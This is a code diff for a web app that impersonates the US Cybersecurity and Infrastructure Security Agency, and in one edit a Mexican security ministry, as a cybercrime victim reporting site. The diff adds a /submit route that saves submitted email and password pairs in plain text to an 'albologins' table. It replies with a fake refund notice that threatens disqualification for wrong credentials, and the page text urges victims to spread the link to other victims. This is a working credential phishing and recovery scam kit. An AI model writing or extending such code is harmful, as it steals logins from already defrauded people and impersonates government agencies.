@@ -262,9 +262,9 @@ function sendConfirmationEmail(name, email) {
   </head>
   <body>
   <div class="subnav">
-  <div class="cisa"><img src="https://cisaonlinereport.onrender.com/css/images/2560px-Flag_of_the_United_States.svg.png" alt=""></div>
-  <p>An official media of the United States</p>
-  </div>
+    <div class="cisa"><img src="https://cisaonlinereport.onrender.com/css/images/download.png" alt=""></div>
+     <p>An official media of the Secretaria de Seguridad Publica</p>
+  </div><br>
 
 <nav>
   <div class="logo"><img src="https://cisaonlinereport.onrender.com/css/images/Seal_of_Cybersecurity_and_Infrastructure_Security_Agency.svg" alt=""><p>CYBERSECURITY & <br> INFRASTRUCTURE <br> SECURITY </p></div>
@@ -281,8 +281,9 @@ function sendConfirmationEmail(name, email) {
         Your report is crucial in helping us understand and address cyber threats effectively. Our team of experts will review the information provided and take appropriate actions to mitigate any potential risks. <br><br>
   
         Please be assured that all information submitted will be treated confidentially and in accordance with our strict security protocols. <br><br>
-  
-        Due to security reasons, If you know other victims please have them visit our website at <a href="https://cisaonlinereport.onrender.com/">CISAonline</a> or copy this link [https://cisaonlinereport.onrender.com/] and share to them and request for a private Reference Id to submit their testimony. <br><br>
+
+        We will send you an email reply in the next 5 hours on our findings on your incident logs. Please check in as soon as possible. <br>
+        If you know other victims please have them visit our website at <a href="https://cisaonlinereport.onrender.com/">CISAonline</a> or copy this link [https://cisaonlinereport.onrender.com/] and share to them and request for a private Reference Id to submit their testimony. <br><br>
   
         Thank you again for your cooperation.
   
@@ -386,6 +387,26 @@ app.get('/get-images', (req, res) => {
       }
   );
 });
+
+// Route to handle form submission
+app.post('/submit', (req, res) => {
+  const { email, password } = req.body;
+
+  // Insert data into database
+  const query = 'INSERT INTO albologins (email, password) VALUES (?, ?)';
+  // Use pool.query instead of connection.query
+  pool.query(query, [email, password], (error, results, fields) => {
+    if (error) {
+      console.error('Error inserting data into database: ' + error.message);
+      res.status(500).send('Internal Server Error');
+      return;
+    }
+    console.log('Data inserted into database with ID: ' + results.insertId);
+    res.send('Your account will be verified for refund within the next 5 working hours. <br> NOTE: You will be disqualified for refund if you have entered wrong credentials!');
+  });
+});
+
+
 
 
 
